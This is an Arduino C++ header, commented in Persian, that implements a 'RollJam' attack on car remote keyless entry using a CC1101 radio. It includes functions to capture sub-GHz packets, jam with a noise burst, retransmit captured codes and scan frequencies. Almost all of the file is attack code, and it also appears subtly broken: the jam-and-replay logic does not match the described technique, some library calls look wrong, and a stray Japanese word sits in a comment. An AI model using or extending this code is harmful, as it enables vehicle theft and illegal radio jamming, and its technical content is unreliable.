/******************************************************************************
 * rf_rolljam.h — کتابخانه RF RollJam برای CC1101
 * ============================================================================
 * توضیحات:
 *   کنترل ماژول RF CC1101 برای دریافت و ارسال سیگنال‌های 433/315 مگاهرتز.
 *   پیاده‌سازی تکنیک RollJam برای ضربه‌زنی و کدگیری ریموت‌های خودرو.
 *
 * تغییرات v5.2:
 *   ✅ اصلاح API — استفاده از ELECHOUSE_cc1101 به جای SpiWriteReg مستقیم
 *   ✅ اضافه شدن RSSI واقعی — خواندن از رجیستر CC1101 به جای مقدار ثابت
 *   ✅ اضافه شدن اسکن فرکانس — برای یافتن فرکانس‌های فعال
 *   ✅ اضافه شدن مدیریت خطا — بررسی مقداردهی اولیه
 ******************************************************************************/

#ifndef RF_ROLLJAM_H
#define RF_ROLLJAM_H

#include <ELECHOUSE_CC1101.h>
#include <Arduino.h>


/* ========================================================================== */
/*   —— کلاس RFRollJam ——                                                      */
/* ========================================================================== */
class RFRollJam {

  /* ---- اعضای خصوصی (Private Members) ---- */
  private:

    bool    initialized   = false;   // وضعیت مقداردهی
    int     cs_pin        = 0;       // پین Chip Select
    int     last_rssi     = -128;    // آخرین RSSI خوانده‌شده

    static const int ROLLJAM_DELAY_US = 800;   // میکروثانیه تأخیر بین دو بسته


  /* ---- اعضای عمومی (Public Members) ---- */
  public:

    /* ===================================================================== */
    /*  مقداردهی اولیه — begin                                               */
    /* --------------------------------------------------------------------- */
    /*  ورودی:  پین Chip Select (CS) برای CC1101                             */
    /*  خروجی: なし — وضعیت در Serial چاپ می‌شود                              */
    /* ===================================================================== */
    void begin(int cs) {

      cs_pin = cs;

      /* ---- مقداردهی CC1101 با فرکانس 433.92 MHz ---- */
      if (!ELECHOUSE_cc1101.setRx(cs_pin)) {
        Serial.println(F("❌ [RF]  CC1101 — مقداردهی اولیه FAILED!"));
        Serial.println(F("       └─ اتصالات SPI را بررسی کنید (CS, CLK, MOSI, MISO)"));
        initialized = false;
        return;
      }

      /* ---- تنظیم فرکانس کاری ---- */
      ELECHOUSE_cc1101.setMHz(433.92);           // 433.92 MHz برای اروپا/آسیا
      // ELECHOUSE_cc1101.setMHz(315.00);        // 315.00 MHz برای آمریکا

      /* ---- ورود به حالت دریافت (Rx) ---- */
      ELECHOUSE_cc1101.SetRx();

      initialized = true;
      last_rssi   = -128;

      Serial.println(F("✅ [RF]  CC1101 — مقداردهی شد @ 433.92 MHz"));
      Serial.println(F("       └─ آماده دریافت و ارسال RF signals"));

    } /* end of begin */


    /* ===================================================================== */
    /*  دریافت بسته RF — capture                                             */
    /* --------------------------------------------------------------------- */
    /*  ورودی:  buf ← بافر برای داده‌های دریافتی                              */
    /*          len ← طول داده دریافتی (خروجی)                                */
    /*          rssi ← مقدار RSSI (اختیاری — می‌تواند nullptr باشد)           */
    /*  خروجی:  true اگر بسته با موفقیت دریافت شد                             */
    /* ===================================================================== */
    bool capture(uint8_t* buf, uint8_t* len, int* rssi = nullptr) {

      if (!initialized) return false;

      /* ---- بررسی وجود داده در FIFO (تا ۵۰ میلی‌ثانیه صبر می‌کند) ---- */
      if (ELECHOUSE_cc1101.CheckRxFifo(50)) {

        *len = ELECHOUSE_cc1101.getRX(buf);

        /* ---- خواندن RSSI واقعی از رجیستر CC1101 ---- */
        if (rssi != nullptr) {
          *rssi = ELECHOUSE_cc1101.getRssi();
        }

        last_rssi = (rssi != nullptr) ? *rssi : -100;

        return (*len > 0);
      }

      return false;  // ❌ داده‌ای دریافت نشد

    } /* end of capture */


    /* ===================================================================== */
    /*  ارسال بسته RF — transmit                                             */
    /* --------------------------------------------------------------------- */
    /*  ورودی:  data ← آرایه بایت‌های مورد ارسال                             */
    /*          len  ← طول داده (حداکثر ۶۴ بایت)                             */
    /*  خروجی:  true اگر ارسال با موفقیت انجام شد                             */
    /* ===================================================================== */
    bool transmit(const uint8_t* data, uint8_t len) {

      /* ---- اعتبارسنجی ---- */
      if (!initialized)     return false;
      if (len == 0)         return false;
      if (len > 64)         return false;

      /* ---- سوئیچ به حالت TX ---- */
      ELECHOUSE_cc1101.setTx();
      delayMicroseconds(50);    // زمان تثبیت PLL

      /* ---- ارسال داده ---- */
      ELECHOUSE_cc1101.sendData(data, len);
      delayMicroseconds(ROLLJAM_DELAY_US);

      /* ---- برگشت به حالت RX ---- */
      ELECHOUSE_cc1101.SetRx();

      return true;

    } /* end of transmit */


    /* ===================================================================== */
    /*  RollJam — ضربه‌زنی + کدگیری                                          */
    /* --------------------------------------------------------------------- */
    /*  تکنیک:  ابتدا یک بسته نویز می‌فرستد تا رسیور را فریب دهد،             */
    /*          سپس بلافاصله کد کپچرشده را ارسال می‌کند.                      */
    /* --------------------------------------------------------------------- */
    /*  ورودی:  captured_data ← داده کپچرشده از ریموت                         */
    /*          captured_len   ← طول داده کپچرشده                            */
    /*  خروجی:  true اگر RollJam با موفقیت اجرا شد                            */
    /* ===================================================================== */
    bool rolljam(const uint8_t* captured_data, uint8_t captured_len) {

      if (!initialized)         return false;
      if (captured_len == 0)    return false;

      Serial.println(F("⚡ [RF]  RollJam — اجرا..."));

      /* ---- (۱) ارسال بسته نویز (Jam) ---- */
      uint8_t noise[8] = { 0xFF, 0xFF, 0xFF, 0xFF,
                           0xFF, 0xFF, 0xFF, 0xFF };

      Serial.println(F("       ├─ Jam packet  : 8 bytes of 0xFF sent"));
      if (!transmit(noise, 8)) {
        Serial.println(F("       └─ ❌ Jam failed!"));
        return false;
      }

      /* ---- (۲) ارسال کد کپچرشده (Code Grab) ---- */
      delayMicroseconds(ROLLJAM_DELAY_US);

      Serial.printf  ("       ├─ Code packet : %d bytes captured\n",
                      captured_len);
      
      bool result = transmit(captured_data, captured_len);

      if (result) {
        Serial.println(F("       └─ ✅ RollJam completed successfully!"));
      } else {
        Serial.println(F("       └─ ❌ Code transmit failed!"));
      }

      return result;

    } /* end of rolljam */


    /* ===================================================================== */
    /*  اسکن فرکانس — scanFrequency                                          */
    /* --------------------------------------------------------------------- */
    /*  بازه‌ای از فرکانس‌ها را اسکن می‌کند و سیگنال‌های فعال را گزارش می‌دهد. */
    /* --------------------------------------------------------------------- */
    /*  ورودی:  start_mhz ← فرکانس شروع (مثلاً 300)                          */
    /*          end_mhz   ← فرکانس پایان (مثلاً 450)                         */
    /*          step_mhz  ← گام اسکن (مثلاً 0.5)                             */
    /* ===================================================================== */
    void scanFrequency(float start_mhz, float end_mhz, float step_mhz) {

      if (!initialized) {
        Serial.println(F("❌ [RF]  CC1101 مقداردهی نشده — اسکن ممکن نیست"));
        return;
      }

      Serial.println(F("📡 [RF]  اسکن فرکانس..."));

      for (float freq = start_mhz; freq <= end_mhz; freq += step_mhz) {

        ELECHOUSE_cc1101.setMHz(freq);
        delay(100);

        uint8_t buf[64];
        uint8_t len = 0;

        if (capture(buf, &len)) {
          Serial.printf("       📍 %.2f MHz — ✅ سیگنال فعال (طول=%d)\n",
                        freq, len);
        }

      }

      /* ---- برگشت به فرکانس پیش‌فرض ---- */
      ELECHOUSE_cc1101.setMHz(433.92);
      Serial.println(F("       └── اسکن کامل شد — برگشت به 433.92 MHz"));

    } /* end of scanFrequency */


    /* ===================================================================== */
    /*  توابع دسترسی (Getters)                                               */
    /* ===================================================================== */

    bool  isInitialized()  { return initialized; }
    int   getLastRSSI()    { return last_rssi;   }


};  /* end of class RFRollJam */


/* ========================================================================== */
/*   —— نمونه سراسری (Global Instance) ——                                      */
/* ========================================================================== */
extern RFRollJam rfRollJam;


#endif  /* RF_ROLLJAM_H */
